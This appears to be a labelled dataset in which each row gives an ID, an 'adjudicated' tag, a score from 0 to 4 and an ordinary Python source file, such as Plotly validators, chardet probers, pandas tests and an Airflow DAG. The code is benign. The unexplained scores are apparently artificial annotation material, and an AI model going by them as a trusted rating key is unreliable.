            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
438	adjudicated	0	"import time

from jet_bridge_base.settings import set_settings


class Configuration(object):

    def __init__(self):
        self.init_time = time.time()

    def get_type(self):
        pass

    def get_version(self):
        pass

    def get_model_description(self, db_table):
        pass

    def get_hidden_model_description(self):
        return []

    def get_settings(self):
        pass

    def on_model_pre_create(self, model, pk):
        pass

    def on_model_post_create(self, model, instance):
        pass

    def on_model_pre_update(self, model, instance):
        pass

    def on_model_post_update(self, model, instance):
        pass

    def on_model_pre_delete(self, model, instance):
        pass

    def on_model_post_delete(self, model, instance):
        pass

    def media_get_available_name(self, path):
        pass

    def media_exists(self, path):
        pass

    def media_listdir(self, path):
        pass

    def media_get_modified_time(self, path):
        pass

    def media_open(self, path, mode='rb'):
        pass

    def media_save(self, path, content):
        pass

    def media_delete(self, path):
        pass

    def media_url(self, path, request):
        pass

    def session_set(self, request, name, value, secure=True):
        pass

    def session_get(self, request, name, default=None, decode=True, secure=True):
        pass

    def session_clear(self, request, name):
        pass

    def clean_sso_application_name(self, name):
        return name.lower().replace('-', '')

    def clean_sso_applications(self, applications):
        return dict(map(lambda x: (self.clean_sso_application_name(x[0]), x[1]), applications.items()))


configuration = Configuration()


def set_configuration(new_configuration):
    global configuration
    configuration = new_configuration
    set_settings(configuration.get_settings())"
236	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scattersmith.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
376	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scattersmith.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
267	adjudicated	2	"""""""Basic implementation to support SOAP-Attachments

See https://www.w3.org/TR/SOAP-attachments

""""""

import base64

from cached_property import cached_property
from requests.structures import CaseInsensitiveDict


class MessagePack:
    def __init__(self, parts):
        self._parts = parts

    def __repr__(self):
        return ""<MessagePack(attachments=[%s])>"" % (
            "", "".join(repr(a) for a in self.attachments)
        )

    @property
    def root(self):
        return self._root

    def _set_root(self, root):
        self._root = root

    @cached_property
    def attachments(self):
        """"""Return a list of attachments.

        :rtype: list of Attachment

        """"""
        return [Attachment(part) for part in self._parts]

    def get_by_content_id(self, content_id):
        """"""get_by_content_id

        :param content_id: The content-id to return
        :type content_id: str
        :rtype: Attachment

        """"""
        for attachment in self.attachments:
            if attachment.content_id == content_id:
                return attachment


class Attachment:
    def __init__(self, part):
        encoding = part.encoding or ""utf-8""
        self.headers = CaseInsensitiveDict(
            {k.decode(encoding): v.decode(encoding) for k, v in part.headers.items()}
        )
        self.content_type = self.headers.get(""Content-Type"", None)
        self.content_id = self.headers.get(""Content-ID"", None)
        self.content_location = self.headers.get(""Content-Location"", None)
        self._part = part

    def __repr__(self):
        return ""<Attachment(%r, %r)>"" % (self.content_id, self.content_type)

    @cached_property
    def content(self):
        """"""Return the content of the attachment

        :rtype: bytes or str

        """"""
        encoding = self.headers.get(""Content-Transfer-Encoding"", None)
        content = self._part.content

        if encoding == ""base64"":
            return base64.b64decode(content)
        elif encoding == ""binary"":
            return content.strip(b""\r\n"")
        else:
            return content"
327	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""CP949""

    @property
    def language(self) -> str:
        return ""Korean"""
294	adjudicated	2	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os

from google.cloud import workflows_v1beta

import main

PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]
LOCATION = ""us-central1""
WORKFLOW_ID = ""myFirstWorkflow""


def test_workflow_execution():
    assert PROJECT != """"

    if not workflow_exists():
        workflow_file = open(""myFirstWorkflow.workflows.yaml"", ""r"").read()

        workflows_client = workflows_v1beta.WorkflowsClient()
        workflows_client.create_workflow(request={
            # Manually construct the location
            # https://github.com/googleapis/python-workflows/issues/21
            ""parent"": f'projects/{PROJECT}/locations/{LOCATION}',
            ""workflow_id"": WORKFLOW_ID,
            ""workflow"": {
                ""name"": WORKFLOW_ID,
                ""source_contents"": workflow_file
            }
        })

    result = main.execute_workflow(PROJECT)
    assert len(result) > 0


def workflow_exists():
    """"""Returns True if the workflow exists in this project
    """"""
    try:
        workflows_client = workflows_v1beta.WorkflowsClient()
        workflow_name = workflows_client.workflow_path(PROJECT, LOCATION, WORKFLOW_ID)
        workflows_client.get_workflow(request={""name"": workflow_name})
        return True
    except Exception as e:
        print(f""Workflow doesn't exist: {e}"")
        return False"
105	adjudicated	0	"# coding: utf-8

if False:  # MYPY
    from typing import Dict, Any  # NOQA

_package_data = dict(
    full_package_name='ruamel.yaml',
    version_info=(0, 17, 21),
    __version__='0.17.21',
    version_timestamp='2022-02-12 09:49:22',
    author='Anthon van der Neut',
    author_email='a.van.der.neut@ruamel.eu',
    description='ruamel.yaml is a YAML parser/emitter that supports roundtrip preservation of comments, seq/map flow style, and map key order',  # NOQA
    entry_points=None,
    since=2014,
    extras_require={
        ':platform_python_implementation==""CPython"" and python_version<""3.11""': ['ruamel.yaml.clib>=0.2.6'],  # NOQA
        'jinja2': ['ruamel.yaml.jinja2>=0.2'],
        'docs': ['ryd'],
    },
    classifiers=[
        'Programming Language :: Python :: 3 :: Only',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: Implementation :: CPython',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Topic :: Text Processing :: Markup',
        'Typing :: Typed',
    ],
    keywords='yaml 1.2 parser round-trip preserve quotes order config',
    read_the_docs='yaml',
    supported=[(3, 5)],  # minimum
    tox=dict(
        env='*f',  # f for 3.5
        fl8excl='_test/lib',
    ),
    # universal=True,
    python_requires='>=3',
    rtfd='yaml',
)  # type: Dict[Any, Any]


version_info = _package_data['version_info']
__version__ = _package_data['__version__']

try:
    from .cyaml import *  # NOQA

    __with_libyaml__ = True
except (ImportError, ValueError):  # for Jython
    __with_libyaml__ = False

from ruamel.yaml.main import *  # NOQA"
45	adjudicated	2	"import _plotly_utils.basevalidators


class DomainValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""domain"", parent_name=""layout.geo"", **kwargs):
        super(DomainValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Domain""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            column
                If there is a layout grid, use the domain for
                this column in the grid for this geo subplot .
                Note that geo subplots are constrained by
                domain. In general, when `projection.scale` is
                set to 1. a map will fit either its x or y
                domain, but not both.
            row
                If there is a layout grid, use the domain for
                this row in the grid for this geo subplot .
                Note that geo subplots are constrained by
                domain. In general, when `projection.scale` is
                set to 1. a map will fit either its x or y
                domain, but not both.
            x
                Sets the horizontal domain of this geo subplot
                (in plot fraction). Note that geo subplots are
                constrained by domain. In general, when
                `projection.scale` is set to 1. a map will fit
                either its x or y domain, but not both.
            y
                Sets the vertical domain of this geo subplot
                (in plot fraction). Note that geo subplots are
                constrained by domain. In general, when
                `projection.scale` is set to 1. a map will fit
                either its x or y domain, but not both.
"""""",
            ),
            **kwargs,
        )"
154	adjudicated	0	"from ZenMaster import ZenMaster
from ZenConfig import ZenConfig
from Common.CEnum import AUTYPE, DATA_SRC, KL_TYPE
from Plot.AnimatePlotDriver import AnimateDriver
from Plot.PlotDriver import PlotDriver

if __name__ == ""__main__"":
    code = ""sz.000001""
    begin_time = ""2018-01-01""
    end_time = None
    data_src = DATA_SRC.BAO_STOCK
    lv_list = [KL_TYPE.K_DAY]

    config = ZenConfig({
        ""bi_strict"": True,
        ""triger_step"": False,
        ""skip_step"": 0,
        ""divergence_rate"": float(""inf""),
        ""bsp2_follow_1"": False,
        ""bsp3_follow_1"": False,
        ""min_zs_cnt"": 0,
        ""bs1_peak"": False,
        ""macd_algo"": ""peak"",
        ""bs_type"": '1,2,3a,1p,2s,3b',
        ""print_warming"": True,
    })

    plot_config = {
        ""plot_kline"": True,
        ""plot_kline_combine"": True,
        ""plot_bi"": True,
        ""plot_seg"": True,
        ""plot_eigen"": False,
        ""plot_zs"": True,
        ""plot_macd"": False,
        ""plot_mean"": False,
        ""plot_channel"": False,
        ""plot_bsp"": True,
        ""plot_extrainfo"": False,
    }

    plot_para = {
        ""seg"": {
        },
        ""bi"": {
            # ""show_num"": True,
            # ""disp_end"": True,
        },
        ""figure"": {
            ""x_range"": 50,
        },
    }
    chan = ZenMaster(
        code=code,
        begin_time=begin_time,
        end_time=end_time,
        data_src=data_src,
        lv_list=lv_list,
        config=config,
        autype=AUTYPE.QFQ,
    )

    if not config.triger_step:
        plot_driver = PlotDriver(
            chan,
            plot_config=plot_config,
            plot_para=plot_para,
        )
        plot_driver.figure.show()
    else:
        AnimateDriver(
            chan,
            plot_config=plot_config,
            plot_para=plot_para,
        )"
385	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""histogram2dcontour.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
14	adjudicated	3	"from collections import OrderedDict


def suggestion_list(inp, options):
    """"""
     Given an invalid input string and a list of valid options, returns a filtered
     list of valid options sorted based on their similarity with the input.
    """"""
    options_by_distance = OrderedDict()
    input_threshold = len(inp) / 2

    for option in options:
        distance = lexical_distance(inp, option)
        threshold = max(input_threshold, len(option) / 2, 1)
        if distance <= threshold:
            options_by_distance[option] = distance

    return sorted(
        list(options_by_distance.keys()), key=lambda k: options_by_distance[k]
    )


def lexical_distance(a, b):
    """"""
     Computes the lexical distance between strings A and B.
     The ""distance"" between two strings is given by counting the minimum number
     of edits needed to transform string A into string B. An edit can be an
     insertion, deletion, or substitution of a single character, or a swap of two
     adjacent characters.
     This distance can be useful for detecting typos in input or sorting
     @returns distance in number of edits
    """"""

    d = [[i] for i in range(len(a) + 1)] or []
    d_len = len(d) or 1
    for i in range(d_len):
        for j in range(1, len(b) + 1):
            if i == 0:
                d[i].append(j)
            else:
                d[i].append(0)

    for i in range(1, len(a) + 1):
        for j in range(1, len(b) + 1):
            cost = 0 if a[i - 1] == b[j - 1] else 1

            d[i][j] = min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + cost)

            if i > 1 and j < 1 and a[i - 1] == b[j - 2] and a[i - 2] == b[j - 1]:
                d[i][j] = min(d[i][j], d[i - 2][j - 2] + cost)

    return d[len(a)][len(b)]"
313	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scatterpolar.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
82	adjudicated	2	"import numpy as np
import pytest

import pandas as pd
import pandas._testing as tm
from pandas.core.arrays import FloatingArray
from pandas.tests.arrays.masked_shared import (
    ComparisonOps,
    NumericOps,
)


class TestComparisonOps(NumericOps, ComparisonOps):
    @pytest.mark.parametrize(""other"", [True, False, pd.NA, -1.0, 0.0, 1])
    def test_scalar(self, other, comparison_op, dtype):
        ComparisonOps.test_scalar(self, other, comparison_op, dtype)

    def test_compare_with_integerarray(self, comparison_op):
        op = comparison_op
        a = pd.array([0, 1, None] * 3, dtype=""Int64"")
        b = pd.array([0] * 3 + [1] * 3 + [None] * 3, dtype=""Float64"")
        other = b.astype(""Int64"")
        expected = op(a, other)
        result = op(a, b)
        tm.assert_extension_array_equal(result, expected)
        expected = op(other, a)
        result = op(b, a)
        tm.assert_extension_array_equal(result, expected)


def test_equals():
    # GH-30652
    # equals is generally tested in /tests/extension/base/methods, but this
    # specifically tests that two arrays of the same class but different dtype
    # do not evaluate equal
    a1 = pd.array([1, 2, None], dtype=""Float64"")
    a2 = pd.array([1, 2, None], dtype=""Float32"")
    assert a1.equals(a2) is False


def test_equals_nan_vs_na():
    # GH#44382

    mask = np.zeros(3, dtype=bool)
    data = np.array([1.0, np.nan, 3.0], dtype=np.float64)

    left = FloatingArray(data, mask)
    assert left.equals(left)
    tm.assert_extension_array_equal(left, left)

    assert left.equals(left.copy())
    assert left.equals(FloatingArray(data.copy(), mask.copy()))

    mask2 = np.array([False, True, False], dtype=bool)
    data2 = np.array([1.0, 2.0, 3.0], dtype=np.float64)
    right = FloatingArray(data2, mask2)
    assert right.equals(right)
    tm.assert_extension_array_equal(right, right)

    assert not left.equals(right)

    # with mask[1] = True, the only difference is data[1], which should
    #  not matter for equals
    mask[1] = True
    assert left.equals(right)"
342	adjudicated	0	"from playwright.sync_api import sync_playwright
import pandas as pd
import numpy as np

def pagina_min_fazenda(cidade, estado, pagina):
    pagina.goto(""https://www.airbnb.com.br/"")


    #FAZENDO A PESQUISA 
    pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/
    header/div/div[2]/div[1]/div/button[1]''').click()
    pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/
    header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/label/div/input''').fill(cidade + ', ' + estado)
    if cidade in pagina.locator('''/html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/div[2]/div''').inner_text():
        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/div[2]/div''').locator('nth = 0').click()
        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[3]/div[2]/div/div/section/div/div/div/div/div[1]/div/div[1]/div/button[2]''').click()
        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[3]/div[2]/div/div/section/div/div/div/div/div[2]/div[2]/div/div[1]/div[2]/div[2]/label''').click()
        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[5]/div[1]/div[2]/button/div/div[1]/svg''').click()


    return 
with sync_playwright() as p:
    
    navegador = p.chromium.launch(headless = False)
    pagina = navegador.new_page(viewport = {'width': 1200, 'height': 800})"
202	adjudicated	4	"#
""""""
This is a utility to 'can' the widths data for certain CID fonts.
Now we're using Unicode, we don't need 20 CMAP files for each Asian
language, nor the widths of the non-normal characters encoded in each
font.  we just want a dictionary of the character widths in a given
font which are NOT 1000 ems wide, keyed on Unicode character (not CID).

Running off CMAP files we get the following widths...::

    >>> font = UnicodeCIDFont('HeiseiMin-W3')
    >>> font.stringWidth(unicode(','), 10)
    2.5
    >>> font.stringWidth(unicode('m'), 10)
    7.7800000000000002
    >>> font.stringWidth(u'\u6771\u4EAC', 10)
    20.0
    >>> 

""""""

from pprint import pprint as pp

from reportlab.pdfbase._cidfontdata import defaultUnicodeEncodings
from reportlab.pdfbase.cidfonts import UnicodeCIDFont


def run():

    buf = []
    buf.append('widthsByUnichar = {}')
    for fontName, (language, encName) in defaultUnicodeEncodings.items():
        print('handling %s : %s : %s' % (fontName, language, encName))

        #this does just about all of it for us, as all the info
        #we need is present.
        font = UnicodeCIDFont(fontName)

        widthsByCID = font.face._explicitWidths
        cmap = font.encoding._cmap
        nonStandardWidthsByUnichar = {}
        for codePoint, cid in cmap.items():
            width = widthsByCID.get(cid, 1000)
            if width != 1000:
                nonStandardWidthsByUnichar[chr(codePoint)] = width
        

        
        print('created font width map (%d items).  ' % len(nonStandardWidthsByUnichar))

        buf.append('widthsByUnichar[""%s""] = %s' % (fontName, repr(nonStandardWidthsByUnichar)))
        
        
    src = '\n'.join(buf) + '\n'
    open('canned_widths.py','w').write(src)
    print('wrote canned_widths.py')

if __name__=='__main__':
    run()
    "
193	adjudicated	3	"import types
from abc import ABCMeta, abstractmethod
from collections.abc import AsyncGenerator, Iterable
from typing import Any, Callable, Coroutine, Dict, Optional, Type, TypeVar

_T = TypeVar(""_T"")


class TestRunner(metaclass=ABCMeta):
    """"""
    Encapsulates a running event loop. Every call made through this object will use the same event
    loop.
    """"""

    def __enter__(self) -> ""TestRunner"":
        return self

    def __exit__(
        self,
        exc_type: Optional[Type[BaseException]],
        exc_val: Optional[BaseException],
        exc_tb: Optional[types.TracebackType],
    ) -> Optional[bool]:
        self.close()
        return None

    @abstractmethod
    def close(self) -> None:
        """"""Close the event loop.""""""

    @abstractmethod
    def run_asyncgen_fixture(
        self,
        fixture_func: Callable[..., ""AsyncGenerator[_T, Any]""],
        kwargs: Dict[str, Any],
    ) -> ""Iterable[_T]"":
        """"""
        Run an async generator fixture.

        :param fixture_func: the fixture function
        :param kwargs: keyword arguments to call the fixture function with
        :return: an iterator yielding the value yielded from the async generator
        """"""

    @abstractmethod
    def run_fixture(
        self,
        fixture_func: Callable[..., Coroutine[Any, Any, _T]],
        kwargs: Dict[str, Any],
    ) -> _T:
        """"""
        Run an async fixture.

        :param fixture_func: the fixture function
        :param kwargs: keyword arguments to call the fixture function with
        :return: the return value of the fixture function
        """"""

    @abstractmethod
    def run_test(
        self, test_func: Callable[..., Coroutine[Any, Any, Any]], kwargs: Dict[str, Any]
    ) -> None:
        """"""
        Run an async test function.

        :param test_func: the test function
        :param kwargs: keyword arguments to call the test function with
        """""""
20	adjudicated	3	"from airflow.models import Variable
from os import getenv, path
from datetime import datetime
from airflow import DAG
from airflow.providers.cncf.kubernetes.operators.spark_kubernetes import SparkKubernetesOperator
from airflow.providers.cncf.kubernetes.sensors.spark_kubernetes import SparkKubernetesSensor
from airflow.providers.cncf.kubernetes.operators.kubernetes_pod import KubernetesPodOperator

# [START env_variables]
SPARK_NAMESPACE = getenv(""SPARK_NAMESPACE"", ""processing"")
# [END env_variables]

# [START env_variables]
DAGS_FOLDER_PATH = path.dirname(__file__)
# [END env_variables]

# [START instantiate_dag]
with DAG(
    dag_id='pipeline_combustiveis',
    schedule_interval=None,
    start_date=datetime(2023, 1, 20),
    catchup=False,
    max_active_runs=1,
    tags=['combustiveis', 'kubernetes-pod-operator', 'spark-operator', 'k8s'],
) as dag:
# [END instantiate_dag]

    ingestion = KubernetesPodOperator(
        task_id=""ingestion"",
        name=""combustiveis-ingestion"",
        is_delete_operator_pod=True,
        namespace=SPARK_NAMESPACE,
        startup_timeout_seconds=120,
        pod_template_file=f""{DAGS_FOLDER_PATH}/pipeline-combustiveis-ingestion.yaml"",
        in_cluster=True,
        get_logs=True,
        env_vars= {
            ""SOURCE_URLS"" : Variable.get(""combustiveis_source_urls"")
        }
    )

    # use spark-on-k8s to operate against the data
    # containerized spark application
    # yaml definition to trigger process
    processing = SparkKubernetesOperator(
        task_id='processing',
        namespace=SPARK_NAMESPACE,
        application_file='pipeline-combustiveis-processing.yaml',
        do_xcom_push=True
    )

    # monitor spark application
    # using sensor to determine the outcome of the task
    # read     from xcom tp check the status [key & value] pair
    processing_status = SparkKubernetesSensor(
        task_id='processing_status',
        namespace=SPARK_NAMESPACE,
        application_name=""{{ task_instance.xcom_pull(task_ids='processing')['metadata']['name']}}"",
        attach_log=True
    )

    # [START task_sequence]
    ingestion >> processing >> processing_status
    # [END task_sequence]"
160	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import GB2312DistributionAnalysis
from .mbcssm import GB2312_SM_MODEL


class GB2312Prober(MultiByteCharSetProber):
    def __init__(self):
        super(GB2312Prober, self).__init__()
        self.coding_sm = CodingStateMachine(GB2312_SM_MODEL)
        self.distribution_analyzer = GB2312DistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""GB2312""

    @property
    def language(self):
        return ""Chinese"""
71	adjudicated	1	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import configparser
import os

from paste.deploy import loadapp

from gunicorn.app.wsgiapp import WSGIApplication
from gunicorn.config import get_default_config_file


def get_wsgi_app(config_uri, name=None, defaults=None):
    if ':' not in config_uri:
        config_uri = ""config:%s"" % config_uri

    return loadapp(
        config_uri,
        name=name,
        relative_to=os.getcwd(),
        global_conf=defaults,
    )


def has_logging_config(config_file):
    parser = configparser.ConfigParser()
    parser.read([config_file])
    return parser.has_section('loggers')


def serve(app, global_conf, **local_conf):
    """"""\
    A Paste Deployment server runner.

    Example configuration:

        [server:main]
        use = egg:gunicorn#main
        host = 127.0.0.1
        port = 5000
    """"""
    config_file = global_conf['__file__']
    gunicorn_config_file = local_conf.pop('config', None)

    host = local_conf.pop('host', '')
    port = local_conf.pop('port', '')
    if host and port:
        local_conf['bind'] = '%s:%s' % (host, port)
    elif host:
        local_conf['bind'] = host.split(',')

    class PasterServerApplication(WSGIApplication):
        def load_config(self):
            self.cfg.set(""default_proc_name"", config_file)

            if has_logging_config(config_file):
                self.cfg.set(""logconfig"", config_file)

            if gunicorn_config_file:
                self.load_config_from_file(gunicorn_config_file)
            else:
                default_gunicorn_config_file = get_default_config_file()
                if default_gunicorn_config_file is not None:
                    self.load_config_from_file(default_gunicorn_config_file)

            for k, v in local_conf.items():
                if v is not None:
                    self.cfg.set(k.lower(), v)

        def load(self):
            return app

    PasterServerApplication().run()"
131	adjudicated	2	"# -*- coding: utf-8 -*-
from django import template

register = template.Library()


class IndentByNode(template.Node):
    def __init__(self, nodelist, indent_level, if_statement):
        self.nodelist = nodelist
        self.indent_level = template.Variable(indent_level)
        if if_statement:
            self.if_statement = template.Variable(if_statement)
        else:
            self.if_statement = None

    def render(self, context):
        indent_level = self.indent_level.resolve(context)
        if self.if_statement:
            try:
